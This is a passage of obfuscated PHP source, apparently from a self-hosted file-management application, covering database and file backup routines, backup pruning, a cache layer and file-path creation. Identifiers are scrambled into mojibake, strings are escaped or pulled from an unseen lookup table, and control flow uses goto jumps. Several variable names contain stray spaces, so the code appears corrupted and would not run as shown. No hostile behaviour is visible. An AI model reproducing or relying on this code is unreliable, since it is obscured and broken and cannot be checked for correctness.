$Ù˜Œƒà‹[$÷ªßÂå‘[761]], $÷ªßÂå‘[762] => self::$manual, $÷ªßÂå‘[293] => array($÷ªßÂå‘[763] => array($÷ªßÂå‘[756] => 0), $÷ªßÂå‘[764] => array($÷ªßÂå‘[756] => 0, $÷ªßÂå‘[765] => 0, $÷ªßÂå‘[766] => 0, $÷ªßÂå‘[33] => $÷ªßÂå‘[12], $÷ªßÂå‘[767] => 0, $÷ªßÂå‘[497] => 0), $÷ªßÂå‘[768] => array($÷ªßÂå‘[756] => 0, $÷ªßÂå‘[765] => 0, $÷ªßÂå‘[766] => 0, $÷ªßÂå‘[767] => 0, $÷ªßÂå‘[497] => 0), $÷ªßÂå‘[199] => array($÷ªßÂå‘[756] => 0, $÷ªßÂå‘[769] => 0, $÷ªßÂå‘[770] => 0, $÷ªßÂå‘[771] => 0, $÷ªßÂå‘[772] => 0, $÷ªßÂå‘[468] => $çÛŒòµ, $÷ªßÂå‘[767] => 0, $÷ªßÂå‘[497] => 0)), $÷ªßÂå‘[767] => time(), $÷ªßÂå‘[497] => 0); $ˆ»ŠÑ²Ä = Model($÷ªßÂå‘[755])->insert($¸•ÂÆ); $¸•ÂÆ[$÷ªßÂå‘[399]] = $ˆ»ŠÑ²Ä; return $¸•ÂÆ; } private function checkStore($èÊÉ„İ) { $ÙÆ‚Ìô™ =& $_SERVER[Ã¶¡¶„æ]; $Ïçœ¬ğ¡ = Model($ÙÆ‚Ìô™[773])->listData($èÊÉ„İ); Model($ÙÆ‚Ìô™[773])->checkConfig($Ïçœ¬ğ¡); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ã¶¡¶„æ][755])->findByName(self::$name); } return self::$option; } public static function set($ñìÈ£Ø) { $ë¶‰û³Š =& $_SERVER[Ã¶¡¶„æ]; $ó”Êê° = self::get(); foreach ($ñìÈ£Ø as $½æ†Ç ” => $©Ø²½†Ë) { $Ãí¶©Ä = explode($ë¶‰û³Š[10], $½æ†Ç ”); $Ó™÷Áµˆ = count($Ãí¶©Ä); switch ($Ó™÷Áµˆ) { case 1: $ó”Êê°[$Ãí¶©Ä[0]] = $©Ø²½†Ë; break; case 2: $ó”Êê°[$Ãí¶©Ä[0]][$Ãí¶©Ä[1]] = $©Ø²½†Ë; break; case 3: $ó”Êê°[$Ãí¶©Ä[0]][$Ãí¶©Ä[1]][$Ãí¶©Ä[2]] = $©Ø²½†Ë; break; } } Model($ë¶‰û³Š[755])->update($ó”Êê°[$ë¶‰û³Š[399]], $ó”Êê°); self::$option = $ó”Êê°; return self::$option; } public function keep() { $ÃÑ–£ÄÄ =& $_SERVER[Ã¶¡¶„æ]; $Ö¯Òˆ‚Ğ = self::get(); if ($Ö¯Òˆ‚Ğ[$ÃÑ–£ÄÄ[293]][$ÃÑ–£ÄÄ[763]][$ÃÑ–£ÄÄ[756]] == $ÃÑ–£ÄÄ[88]) { return; } $this->backupKeep($Ö¯Òˆ‚Ğ); self::set(array($ÃÑ–£ÄÄ[774] => 1)); } private function backupKeep($¥°«äİ) { $ğù÷•² =& $_SERVER[Ã¶¡¶„æ]; if (self::$manual == 1) { return; } $à—Î’š = Model($ğù÷•²[755])->listData(); if (empty($à—Î’š)) { return; } $“äê¹ú = 0; $á¦™¸Ï = array(); foreach ($à—Î’š as $×’‘ÑúÌ) { if ($“äê¹ú >= 7) { break; } $á¦™¸Ï[] = $×’‘ÑúÌ[$ğù÷•²[32]]; $“äê¹ú++; } for ($“äê¹ú = 0; $“äê¹ú < 12; $“äê¹ú++) { $á¦™¸Ï[] = date($ğù÷•²[775], strtotime("\55{$“äê¹ú}\x20\x6d\x6f\156\164\150\163")); } $á¦™¸Ï = array_unique($á¦™¸Ï); $­¼–ÜÊÎ = Model($ğù÷•²[776])->get($ğù÷•²[777]); foreach ($à—Î’š as $×’‘ÑúÌ) { if (isset($×’‘ÑúÌ[$ğù÷•²[762]]) && $×’‘ÑúÌ[$ğù÷•²[762]] == $ğù÷•²[88]) { continue; } if (!empty($×’‘ÑúÌ[$ğù÷•²[32]]) && in_array($×’‘ÑúÌ[$ğù÷•²[32]], $á¦™¸Ï)) { continue; } Model($ğù÷•²[755])->remove($×’‘ÑúÌ[$ğù÷•²[399]]); $Šö¢ãÍ = $this->backupPath($¥°«äİ, $­¼–ÜÊÎ); IO::remove($Šö¢ãÍ, !1); } } private function backupPath($ÖîŠß°, $Ó»š÷Äİ = false) { $Ïğ£Ğòó =& $_SERVER[Ã¶¡¶„æ]; if (!$Ó»š÷Äİ) { $Ó»š÷Äİ = Model($Ïğ£Ğòó[776])->get($Ïğ£Ğòó[777]); } $ÔØ´¾… = $ÖîŠß°[$Ïğ£Ğòó[32]]; $•ó€Â¤ = substr(md5($Ïğ£Ğòó[778] . $Ó»š÷Äİ . $ÔØ´¾…), 0, 8); return "\x7b\151\157\72{$ÖîŠß°[$Ïğ£Ğòó[758]]}\x7d\x2f\144\x61\164\x61\x62\141\163\145\x2f\x62\x61\143\x6b\x75\x70\x2f" . $ÔØ´¾… . $Ïğ£Ğòó[11] . $•ó€Â¤; } public function db() { $Ãô²²ÙÚ =& $_SERVER[Ã¶¡¶„æ]; $âÛ½ñ¢ß = self::get(); if ($âÛ½ñ¢ß[$Ãô²²ÙÚ[293]][$Ãô²²ÙÚ[764]][$Ãô²²ÙÚ[756]] == $Ãô²²ÙÚ[88]) { return !0; } $œ‹§‹Ë = new BackupDb(); if (!$œ‹§‹Ë->index()) { return !1; } self::set(array($Ãô²²ÙÚ[779] => 1)); return !0; } public function dbFile() { $é‹‡Ë‚• =& $_SERVER[Ã¶¡¶„æ]; $Æç‚¤¥† = self::get(); if ($Æç‚¤¥†[$é‹‡Ë‚•[293]][$é‹‡Ë‚•[768]][$é‹‡Ë‚•[756]] == $é‹‡Ë‚•[88]) { return !0; } $•ª×øÕĞ = new BackupDbFile(); if (!$•ª×øÕĞ->index()) { return !1; } self::set(array($é‹‡Ë‚•[780] => 1)); return !0; } public function file() { $Úñ¢Ú¹¶ =& $_SERVER[Ã¶¡¶„æ]; $ß¨’Ëİ = self::get(); if ($ß¨’Ëİ[$Úñ¢Ú¹¶[293]][$Úñ¢Ú¹¶[199]][$Úñ¢Ú¹¶[756]] == $Úñ¢Ú¹¶[88]) { return !0; } if (!isset($ß¨’Ëİ[$Úñ¢Ú¹¶[761]]) || $ß¨’Ëİ[$Úñ¢Ú¹¶[761]] == $Úñ¢Ú¹¶[197]) { $ëØÅíì = new BackupFile(); if (!$ëØÅíì->index()) { return !1; } } self::set(array($Úñ¢Ú¹¶[781] => 1, $Úñ¢Ú¹¶[756] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¹üíØ‹ =& $_SERVER[Ã¶¡¶„æ]; $ªÚ¬İş = Backup::get(); self::$io = $ªÚ¬İş[$¹üíØ‹[758]]; self::$name = $ªÚ¬İş[$¹üíØ‹[32]]; $°Í°ŸÆ = new DbManage(); $‚ˆá«éÔ = $°Í°ŸÆ->dbType(); $£Ù¥áÆÒ = array($¹üíØ‹[782] => $‚ˆá«éÔ, $¹üíØ‹[783] => time()); Backup::set($£Ù¥áÆÒ); $ÔÎ‡ê´º = $this->tmpFilesPath() . $¹üíØ‹[784] . self::$name . $¹üíØ‹[8]; del_dir($ÔÎ‡ê´º); mk_dir($ÔÎ‡ê´º); $ñÁ÷‹ä = $Î“œã›¯ = 0; $½Ÿş¼®İ = new Task($¹üíØ‹[785], $¹üíØ‹[786], 0, LNG($¹üíØ‹[787]) . $¹üíØ‹[788] . LNG($¹üíØ‹[789])); try { $¥¯ÀÅ¾Ë = $°Í°ŸÆ->db()->getTables(); } catch (Exception $ƒì‡şÔ…) { $½Ÿş¼®İ->end(); return !1; } $¥¯ÀÅ¾Ë = array_diff($¥¯ÀÅ¾Ë, array($¹üíØ‹[790], $¹üíØ‹[791])); foreach ($¥¯ÀÅ¾Ë as $Š‡¬££¶) { $ñÁ÷‹ä += $°Í°ŸÆ->model($Š‡¬££¶)->count(); } $½Ÿş¼®İ->task[$¹üíØ‹[792]] = $ñÁ÷‹ä; $GLOBALS[$¹üíØ‹[793]] = self::$name; foreach ($¥¯ÀÅ¾Ë as $Š‡¬££¶) { $üşáíÄÑ = $ÔÎ‡ê´º . $Š‡¬££¶ . $¹üíØ‹[794]; $£ ¨‡…İ = null; if ($Š‡¬££¶ == $¹üíØ‹[795] && (!isset($ªÚ¬İş[$¹üíØ‹[761]]) || $ªÚ¬İş[$¹üíØ‹[761]] == $¹üíØ‹[197])) { $£ ¨‡…İ = self::$io; } $Î“œã›¯ += $°Í°ŸÆ->sqlFromDb($Š‡¬££¶, $üşáíÄÑ, $½Ÿş¼®İ, $£ ¨‡…İ); } unset($GLOBALS[$¹üíØ‹[793]]); $½Ÿş¼®İ->end(); if ($Î“œã›¯ > $ñÁ÷‹ä) { $ñÁ÷‹ä = $Î“œã›¯; } $£Ù¥áÆÒ = array($¹üíØ‹[782] => $‚ˆá«éÔ, $¹üíØ‹[779] => 1, $¹üíØ‹[796] => $ñÁ÷‹ä, $¹üíØ‹[797] => $Î“œã›¯, $¹üíØ‹[798] => time()); Backup::set($£Ù¥áÆÒ); if ($ñÁ÷‹ä - $Î“œã›¯ > 0) { $Û±¹Ê¢ = $¹üíØ‹[799]; if (stristr(I18n::getType(), $¹üíØ‹[800])) { $Û±¹Ê¢ = $¹üíØ‹[801]; } write_log(array($Û±¹Ê¢, $£Ù¥áÆÒ), $¹üíØ‹[786]); return !1; } return !0; } private function tmpFilesPath() { $ÅÓâé =& $_SERVER[Ã¶¡¶„æ]; $Íš¼ù± = TEMP_FILES; if ($GLOBALS[$ÅÓâé[6]][$ÅÓâé[89]][$ÅÓâé[802]]) { $Íš¼ù± = $GLOBALS[$ÅÓâé[6]][$ÅÓâé[89]][$ÅÓâé[802]]; if (!mk_dir($Íš¼ù±) || !is_writable($Íš¼ù±) || !IO::mkfile($Íš¼ù± . $ÅÓâé[803])) { $Íš¼ù± = TEMP_FILES; } } return $Íš¼ù±; } } goto C“Å½È¶Ø; C“Å½È¶Ø: class BackupDbFile { public function __construct() { } public function index() { $ùÂ±Óãû =& $_SERVER[Ã¶¡¶„æ]; $”ĞÜÎéÌ = Backup::get(); $ÅŠŒÅƒ¦ = $”ĞÜÎéÌ[$ùÂ±Óãû[32]]; $á¨ØÂ¢ = $this->tmpFilesPath() . "\x62\x61\143\x6b\165\160\x5f{$ÅŠŒÅƒ¦}\x2f"; $ôî•ª¥ = $this->backupPath($”ĞÜÎéÌ); if (!($ôî•ª¥ = IO::mkdir($ôî•ª¥))) { return !1; } $˜»¬³’ğ = IO::listPath($á¨ØÂ¢); $ØşùúÃ = isset($˜»¬³’ğ[$ùÂ±Óãû[83]]) ? $˜»¬³’ğ[$ùÂ±Óãû[83]] : array(); $ÉòÈ°Ä’ = array_sum(array_column($ØşùúÃ, $ùÂ±Óãû[76])); if (!$ÉòÈ°Ä’) { return !1; } $ı°ÄÈ×ä = array($ùÂ±Óãû[804] => $ÉòÈ°Ä’, $ùÂ±Óãû[805] => time()); Backup::set($ı°ÄÈ×ä); $ÊÔÌå¡í = new TaskFileTransfer($ùÂ±Óãû[806], $ùÂ±Óãû[786], count($ØşùúÃ), LNG($ùÂ±Óãû[787]) . $ùÂ±Óãû[386] . LNG($ùÂ±Óãû[789]) . $ùÂ±Óãû[807]); $ÊÔÌå¡í->task[$ùÂ±Óãû[769]] = $ÉòÈ°Ä’; foreach ($˜»¬³’ğ[$ùÂ±Óãû[83]] as $Ûüƒï¤Ë) { $‡Ù¹åß = IO::move($Ûüƒï¤Ë[$ùÂ±Óãû[84]], $ôî•ª¥); if (!$‡Ù¹åß) { $ÊÔÌå¡í->end(); $ÊØ‰Ä¤© = IO::getLastError($ùÂ±Óãû[808] . $Ûüƒï¤Ë[$ùÂ±Óãû[84]] . $ùÂ±Óãû[809] . $ôî•ª¥ . $ùÂ±Óãû[164]); write_log($ÊØ‰Ä¤©, $ùÂ±Óãû[786]); return !1; } } $Š¢ÕŸğ— = new DbManage(); $’÷¤êğ¤ = $Š¢ÕŸğ—->getSqlFile(); if (!$’÷¤êğ¤[$ùÂ±Óãû[810]] || !$’÷¤êğ¤[$ùÂ±Óãû[13]]) { return !1; } IO::move($’÷¤êğ¤[$ùÂ±Óãû[810]], $ôî•ª¥); IO::move($’÷¤êğ¤[$ùÂ±Óãû[13]], $ôî•ª¥); $ÊÔÌå¡í->end(); $ı°ÄÈ×ä = array($ùÂ±Óãû[811] => $ÉòÈ°Ä’, $ùÂ±Óãû[812] => time()); Backup::set($ı°ÄÈ×ä); return !0; } private function backupPath($ğ¤èÂä¢) { $òÒóÚÖì =& $_SERVER[Ã¶¡¶„æ]; $µæáâ¾Ï = $ğ¤èÂä¢[$òÒóÚÖì[32]]; $Ì¤Êõ•ô = Model($òÒóÚÖì[776])->get($òÒóÚÖì[777]); $şû¯ĞŠÎ = substr(md5($òÒóÚÖì[778] . $Ì¤Êõ•ô . $µæáâ¾Ï), 0, 8); return "\173\x69\157\x3a{$ğ¤èÂä¢[$òÒóÚÖì[758]]}\175\x2f\x64\141\x74\141\142\141\x73\145\x2f\142\141\x63\x6b\165\160\57" . $µæáâ¾Ï . $òÒóÚÖì[11] . $şû¯ĞŠÎ; } private function tmpFilesPath() { $Šæ¿ò§Á =& $_SERVER[Ã¶¡¶„æ]; $éÀü…Ã‹ = TEMP_FILES; if ($GLOBALS[$Šæ¿ò§Á[6]][$Šæ¿ò§Á[89]][$Šæ¿ò§Á[802]]) { $éÀü…Ã‹ = $GLOBALS[$Šæ¿ò§Á[6]][$Šæ¿ò§Á[89]][$Šæ¿ò§Á[802]]; if (!mk_dir($éÀü…Ã‹) || !is_writable($éÀü…Ã‹) || !IO::mkfile($éÀü…Ã‹ . $Šæ¿ò§Á[803])) { $éÀü…Ã‹ = TEMP_FILES; } } return $éÀü…Ã‹; } } class BackupFile { public function __construct() { } public function index() { $¢«¨›Ş = Backup::get(); $èí„ûÄ = $¢«¨›Ş[$_SERVER[Ã¶¡¶„æ][293]][$_SERVER[Ã¶¡¶„æ][199]][$_SERVER[Ã¶¡¶„æ][468]]; $ØøÌÎè¾ = array($_SERVER[Ã¶¡¶„æ][469] => array($_SERVER[Ã¶¡¶„æ][813], $èí„ûÄ), $_SERVER[Ã¶¡¶„æ][814] => array($_SERVER[Ã¶¡¶„æ][331], $¢«¨›Ş[$_SERVER[Ã¶¡¶„æ][758]])); $œŞ¿ÂÑÆ = (int) Model($_SERVER[Ã¶¡¶„æ][795])->where($ØøÌÎè¾)->count($_SERVER[Ã¶¡¶„æ][468]); $›í¾Ãˆ¼ = (int) Model($_SERVER[Ã¶¡¶„æ][795])->where($ØøÌÎè¾)->sum($_SERVER[Ã¶¡¶„æ][76]); $çÆàœ€¾ = new TaskFileTransfer($_SERVER[Ã¶¡¶„æ][815], $_SERVER[Ã¶¡¶„æ][786], $œŞ¿ÂÑÆ, LNG($_SERVER[Ã¶¡¶„æ][787]) . $_SERVER[Ã¶¡¶„æ][788] . LNG($_SERVER[Ã¶¡¶„æ][816])); $çÆàœ€¾->task[$_SERVER[Ã¶¡¶„æ][769]] = $›í¾Ãˆ¼; $Ù•îĞÃÍ = array($_SERVER[Ã¶¡¶„æ][817] => $œŞ¿ÂÑÆ, $_SERVER[Ã¶¡¶„æ][818] => $›í¾Ãˆ¼, $_SERVER[Ã¶¡¶„æ][819] => time()); Backup::set($Ù•îĞÃÍ); $ãÙ¸†«õ = !0; $™ÇŠ²×Á = $this->storeIds(); $¡ôÕÆå¹ = 1; $Œ´ ´«¥ = 1000; $ü¡œÁÉ = $ß‰ÑĞÆ = 0; $é›Ïò‚¾ = array(); $¨ƒŞ­ = $ú šÀ¹ = 0; do { $ØŸ£Öç× = $_SERVER[Ã¶¡¶„æ][820]; $©ÑıÁõÈ = Model($_SERVER[Ã¶¡¶„æ][795])->where($ØøÌÎè¾)->field($ØŸ£Öç×)->order($_SERVER[Ã¶¡¶„æ][821])->selectPage($Œ´ ´«¥, $¡ôÕÆå¹); $Æı„ËÚ¤ = !empty($©ÑıÁõÈ[$_SERVER[Ã¶¡¶„æ][369]]) ? $©ÑıÁõÈ[$_SERVER[Ã¶¡¶„æ][369]] : array(); foreach ($Æı„ËÚ¤ as $Øª¸Ú«å) { if (!$this->_fileExist($Øª¸Ú«å, $é›Ïò‚¾, $™ÇŠ²×Á)) { $œŞ¿ÂÑÆ -= 1; $›í¾Ãˆ¼ -= (int) $Øª¸Ú«å[$_SERVER[Ã¶¡¶„æ][76]]; write_log("\x66\x69\x6c\x65\x20\156\x6f\x74\x20\x65\170\151\163\164\x2e\146\151\x6c\x65\111\x44\x3a{$Øª¸Ú«å[$_SERVER[Ã¶¡¶„æ][468]]}\54\40\x70\x61\164\x68\x3a{$Øª¸Ú«å[$_SERVER[Ã¶¡¶„æ][84]]}", $_SERVER[Ã¶¡¶„æ][822]); continue; } $ÓíÓ–ù = $Øª¸Ú«å[$_SERVER[Ã¶¡¶„æ][84]]; $ßçÂü—½ = "\173\151\157\72{$¢«¨›Ş[$_SERVER[Ã¶¡¶„æ][758]]}\x7d" . substr($ÓíÓ–ù, strlen("\x7b\x69\x6f\72{$Øª¸Ú«å[$_SERVER[Ã¶¡¶„æ][823]]}\x7d")); if (IO::exist($ßçÂü—½)) { $çÆàœ€¾->updateFileEnd($Øª¸Ú«å[$_SERVER[Ã¶¡¶„æ][32]], $Øª¸Ú«å[$_SERVER[Ã¶¡¶„æ][76]]); } else { $ßçÂü—½ = get_path_father($ßçÂü—½); IO::mkdir($ßçÂü—½); if (!IO::copy($ÓíÓ–ù, $ßçÂü—½, $_SERVER[Ã¶¡¶„æ][824])) { write_log($_SERVER[Ã¶¡¶„æ][825] . $ÓíÓ–ù . $_SERVER[Ã¶¡¶„æ][809] . $ßçÂü—½ . $_SERVER[Ã¶¡¶„æ][164], $_SERVER[Ã¶¡¶„æ][786]); $ãÙ¸†«õ = !1; break; } } $èí„ûÄ = $Øª¸Ú«å[$_SERVER[Ã¶¡¶„æ][468]]; $ß‰ÑĞÆ += 1; $ü¡œÁÉ += $Øª¸Ú«å[$_SERVER[Ã¶¡¶„æ][76]]; $ú šÀ¹ += 1; $¨ƒŞ­ += $Øª¸Ú«å[$_SERVER[Ã¶¡¶„æ][76]]; if ($ü¡œÁÉ >= 1024 * 1024 * 100) { $Ù•îĞÃÍ = array($_SERVER[Ã¶¡¶„æ][826] => $èí„ûÄ, $_SERVER[Ã¶¡¶„æ][827] => $ú šÀ¹, $_SERVER[Ã¶¡¶„æ][828] => $¨ƒŞ­); Backup::set($Ù•îĞÃÍ); $ü¡œÁÉ = $ß‰ÑĞÆ = 0; } } $ÂÕ“…’ = count($Æı„ËÚ¤); $¡ôÕÆå¹++; } while ($ÂÕ“…’ == $Œ´ ´«¥); $çÆàœ€¾->end(); $Ù•îĞÃÍ = array($_SERVER[Ã¶¡¶„æ][829] => 1, $_SERVER[Ã¶¡¶„æ][497] => time(), $_SERVER[Ã¶¡¶„æ][781] => 1, $_SERVER[Ã¶¡¶„æ][826] => $èí„ûÄ, $_SERVER[Ã¶¡¶„æ][818] => $›í¾Ãˆ¼, $_SERVER[Ã¶¡¶„æ][817] => $œŞ¿ÂÑÆ, $_SERVER[Ã¶¡¶„æ][830] => time()); if ($ß‰ÑĞÆ) { $Ù•îĞÃÍ[$_SERVER[Ã¶¡¶„æ][827]] = $ú šÀ¹; $Ù•îĞÃÍ[$_SERVER[Ã¶¡¶„æ][828]] = $¨ƒŞ­; } Backup::set($Ù•îĞÃÍ); $this->_fileFilter($é›Ïò‚¾); return !0; } private function _fileExist($…ÌøÖ¥, &$¦Šù´çê, $¦®Üçİ®) { $”£Öáİ =& $_SERVER[Ã¶¡¶„æ]; $í£Ì×Œ = $…ÌøÖ¥[$”£Öáİ[84]]; if (in_array($…ÌøÖ¥[$”£Öáİ[468]], $¦Šù´çê)) { return !1; } if (!in_array($…ÌøÖ¥[$”£Öáİ[823]], $¦®Üçİ®)) { return !1; } if (IO::exist($í£Ì×Œ)) { return !0; } $ı¹ìÛ“œ = get_path_father($í£Ì×Œ); if (IO::exist($ı¹ìÛ“œ)) { $¦Šù´çê[] = $…ÌøÖ¥[$”£Öáİ[468]]; return !1; } $–Òèçæ¶ = array($”£Öáİ[823] => $…ÌøÖ¥[$”£Öáİ[823]], $”£Öáİ[84] => array($”£Öáİ[383], "{$ı¹ìÛ“œ}\45")); $Ñ×½³ñ = Model($”£Öáİ[795])->where($–Òèçæ¶)->field($”£Öáİ[469])->select(); $¦Šù´çê = array_merge($¦Šù´çê, array_to_keyvalue($Ñ×½³ñ, $”£Öáİ[12], $”£Öáİ[468])); return !1; } private function _fileFilter($ê•½”Ãá) { $Ê‹¼Ëóâ =& $_SERVER[Ã¶¡¶„æ]; if (empty($ê•½”Ãá)) { return; } $§¨ÓŸ = array($Ê‹¼Ëóâ[468] => array($Ê‹¼Ëóâ[7], array_unique($ê•½”Ãá))); $ªîÈÄì² = Model($Ê‹¼Ëóâ[831])->where($§¨ÓŸ)->field($Ê‹¼Ëóâ[402])->select(); foreach ($ªîÈÄì² as $Ñ«Üáû•) { Model($Ê‹¼Ëóâ[831])->remove($Ñ«Üáû•[$Ê‹¼Ëóâ[402]], !1); } } private function storeIds() { $ÙÏĞŸ” =& $_SERVER[Ã¶¡¶„æ]; $·¥‡ÅŒÛ = Model($ÙÏĞŸ”[773])->listData(); $ÂÓ°ş™ = array(); $Ïè§ß‡Ş = $GLOBALS[$ÙÏĞŸ”[6]][$ÙÏĞŸ”[89]][$ÙÏĞŸ”[832]]; foreach ($·¥‡ÅŒÛ as $¿õµÏÛÉ) { $–³±²­„ = strtolower($¿õµÏÛÉ[$ÙÏĞŸ”[95]]); if (!isset($Ïè§ß‡Ş[$–³±²­„])) { continue; } $±áğ¥€ = $ÙÏĞŸ”[74] . (isset($Ïè§ß‡Ş[$–³±²­„]) ? $Ïè§ß‡Ş[$–³±²­„] : ucfirst($–³±²­„)); if (!class_exists($±áğ¥€)) { continue; } $ÂÓ°ş™[] = $¿õµÏÛÉ[$ÙÏĞŸ”[399]]; } return $ÂÓ°ş™; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $²Öø‘Öê =& $_SERVER[Ã¶¡¶„æ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¹ĞŸµŒ‚ = $GLOBALS[$²Öø‘Öê[6]][$²Öø‘Öê[349]]; $˜ï¡ä‡Ñ = $¹ĞŸµŒ‚[$¹ĞŸµŒ‚[$²Öø‘Öê[833]]]; $Æ³È¬÷º = $¹ĞŸµŒ‚[$²Öø‘Öê[834]]; switch ($¹ĞŸµŒ‚[$²Öø‘Öê[833]]) { case $²Öø‘Öê[21]: self::$handle = Model($²Öø‘Öê[835]); break; case $²Öø‘Öê[836]: self::$handle = new CacheRedis($˜ï¡ä‡Ñ, $Æ³È¬÷º); break; case $²Öø‘Öê[837]: self::$handle = new CacheMemcached($˜ï¡ä‡Ñ, $Æ³È¬÷º); break; case $²Öø‘Öê[199]: self::$handle = new CacheFile($˜ï¡ä‡Ñ, $Æ³È¬÷º); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Í…Ğ•õ) { if (is_array($Í…Ğ•õ) || is_object($Í…Ğ•õ)) { $Í…Ğ•õ = json_encode($Í…Ğ•õ); } $Í…Ğ•õ = rawurlencode($Í…Ğ•õ); return md5(KOD_SITE_ID . $_SERVER[Ã¶¡¶„æ][11] . $Í…Ğ•õ); } public static function get($“åµ³÷„, $ı¬Ü…î÷ = false) { $·¶¥’ª¡ = self::key($“åµ³÷„); if ($ı¬Ü…î÷) { return unserialize(self::init()->get($·¶¥’ª¡)); } if (!isset(self::$memoryCache[$·¶¥’ª¡])) { $Ğî£ªßã = self::init()->get($·¶¥’ª¡); self::$memoryCache[$·¶¥’ª¡] = unserialize($Ğî£ªßã); } return self::$memoryCache[$·¶¥’ª¡]; } public static function set($ÂÙäø©ı, $–óÍ”¼ö, $ú”ÒŠÁ = false) { $°Ïê™Óª = self::key($ÂÙäø©ı); if (isset(self::$memoryCache[$°Ïê™Óª]) && self::$memoryCache[$°Ïê™Óª] === $–óÍ”¼ö) { return !0; } if ($ú”ÒŠÁ === 0) { self::$memoryCache[$°Ïê™Óª] = $–óÍ”¼ö; return !0; } CacheLock::lock($ÂÙäø©ı); $õê³„Ñ = self::init()->set($°Ïê™Óª, serialize($–óÍ”¼ö), $ú”ÒŠÁ); self::$memoryCache[$°Ïê™Óª] = $–óÍ”¼ö; CacheLock::unlock($ÂÙäø©ı); return $õê³„Ñ; } public static function getCall($ªò€²Õü, $¹ğÃº€Ğ, $Ä¿€í£Í, $†Ò¨¯±¶ = array()) { $®ë…ÒüÊ =& $_SERVER[Ã¶¡¶„æ]; $Ú«“µö• = self::get($ªò€²Õü); if ($Ú«“µö• || $Ú«“µö• === $®ë…ÒüÊ[12]) { return $Ú«“µö•; } $Ú«“µö• = call_user_func_array($Ä¿€í£Í, $†Ò¨¯±¶); $Ú«“µö• = $Ú«“µö• ? $Ú«“µö• : $®ë…ÒüÊ[12]; self::set($ªò€²Õü, $Ú«“µö•, $¹ğÃº€Ğ); return $Ú«“µö•; } public static function remove($Œüêİ³) { $À×ÑÀÊ = self::key($Œüêİ³); unset(self::$memoryCache[$À×ÑÀÊ]); self::clearTimeout(); CacheLock::lock($Œüêİ³); $•ÅõÇÚ’ = self::init()->remove($À×ÑÀÊ); CacheLock::unlock($Œüêİ³); return $•ÅõÇÚ’; } public static function removeMemory($ñåØ¿çÛ) { $¥åƒŠÅ‹ = self::key($ñåØ¿çÛ); unset(self::$memoryCache[$¥åƒŠÅ‹]); } public static function clearMemory($‚ûÂÂ = false) { if ($‚ûÂÂ) { $‚ûÂÂ = self::key($‚ûÂÂ); unset(self::$memoryCache[$‚ûÂÂ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ã¶¡¶„æ][838])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ã¶¡¶„æ][839])) { self::init()->clearTimeout(); } } } goto aŠÔÄ½¶ÀÇ; C°‰ˆ²êÚÕ: class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\151\154\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\x61\155\x65" => "\151\157\137\x66\x69\154\145\137\x6d\145\x74\x61", "\155\145\x74\141\106\x69\x65\154\x64" => "\x66\x69\x6c\x65\111\x44"); public function fileInfo($’âúÆæä) { $ïèÃß± =& $_SERVER[Ã¶¡¶„æ]; static $Äöò‹ÍÁ = array(); if (!isset($Äöò‹ÍÁ[$’âúÆæä])) { $¦­ì‘úû = $ïèÃß±[1914]; $€Î“çë = Model($ïèÃß±[471])->field($¦­ì‘úû)->where(array($ïèÃß±[469] => $’âúÆæä))->find(); $Äöò‹ÍÁ[$’âúÆæä] = $€Î“çë; } return $Äöò‹ÍÁ[$’âúÆæä]; } public function addFileByContent($¸ôØ×Ü = '', $™øŞºá’ = '') { $¶‚úÁ¹İ =& $_SERVER[Ã¶¡¶„æ]; $‘îÊöîü = TEMP_PATH . $¶‚úÁ¹İ[1915]; if (!is_dir($‘îÊöîü)) { mk_dir($‘îÊöîü); } $Ü¡šÕ÷Ø = $‘îÊöîü . $¶‚úÁ¹İ[1916] . rand_string(16); file_put_contents($Ü¡šÕ÷Ø, $¸ôØ×Ü); $¶¥Ğ’Ç = $this->addFile($Ü¡šÕ÷Ø, $™øŞºá’, !0); if (file_exists($Ü¡šÕ÷Ø)) { @unlink($Ü¡šÕ÷Ø); } return $¶¥Ğ’Ç; } public function createFileName($âÕéğ½à, $»ö•©ığ = false, $—µõúÓÛ = false) { $¨”ù¢­ =& $_SERVER[Ã¶¡¶„æ]; $Ï‹½¾÷‡ = IO::init($¨”ù¢­[8]); $Úó€ÓÕÏ = $this->makeFilePath($âÕéğ½à, $Ï‹½¾÷‡, $»ö•©ığ, $—µõúÓÛ); $†×Õûğ¬ = $Ï‹½¾÷‡->pathFather($Úó€ÓÕÏ); static $ Ùª ®õ = false; $ò­æºòĞ = $¨”ù¢­[1917] . md5($†×Õûğ¬); if (!$ Ùª ®õ && !Cache::get($ò­æºòĞ)) { $ Ùª ®õ = !0; $ÅÀ–‹ùá = IO::mkdir($†×Õûğ¬); if (!IO::exist($ÅÀ–‹ùá . $¨”ù¢­[803])) { IO::mkfile($ÅÀ–‹ùá . $¨”ù¢­[803]); } Cache::set($ò­æºòĞ, 1, 3600 * 2); } return $Úó€ÓÕÏ; } public function makeFilePath($ àÑ˜Ç„, $¢£Òá´ª, $©§”È¥Ë = false, $úîƒĞ‚™ = false) { $æñÂˆ¿¢ =& $_SERVER[Ã¶¡¶„æ]; $ÄÇË”Ş· = Model($æñÂˆ¿¢[776])->get($æñÂˆ¿¢[1918]); $şâÎ•š‹ = KodIO::defaultIO() . date($æñÂˆ¿¢[1919]); $³Üì®ã¸ = $şâÎ•š‹ . rand_string(5) . short_id(100); $ àÑ˜Ç„ = str_replace($æñÂˆ¿¢[8], $æñÂˆ¿¢[11], KodIO::clear($ àÑ˜Ç„)); $÷Í·õèŞ = $¢£Òá´ª->ext($ àÑ˜Ç„); if (!$ àÑ˜Ç„) { $ÄÇË”Ş· = $æñÂˆ¿¢[1920]; } switch ($ÄÇË”Ş·) { case $æñÂˆ¿¢[1921]: $³Üì®ã¸ = $³Üì®ã¸ . $æñÂˆ¿¢[10] . $¢£Òá´ª->ext($ àÑ˜Ç„); if ($÷Í·õèŞ == $æñÂˆ¿¢[1858]) { $³Üì®ã¸ 